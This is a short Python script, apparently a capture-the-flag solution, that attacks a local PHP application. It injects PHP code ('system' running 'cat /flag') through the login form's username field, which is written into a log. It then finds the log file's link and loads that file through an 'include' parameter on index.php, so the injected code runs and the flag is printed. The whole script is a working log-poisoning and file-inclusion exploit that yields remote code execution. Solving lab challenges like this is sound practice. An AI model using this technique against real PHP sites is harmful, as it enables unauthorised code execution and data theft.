import httpx
from bs4 import BeautifulSoup

payload = "<?php system('cat /flag') ?>"
endpoint = 'http://localhost:8888'

r = httpx.post(f'{endpoint}/login.php', data={'username': payload, 'password': 'anything'})
# print(f'[{r.status_code}] {r.text}')

soup = BeautifulSoup(r.text, features="lxml")
logFile = soup.find('a')['href']
print(logFile)

r = httpx.get(f'{endpoint}/index.php?include={logFile}')
print(r.text)
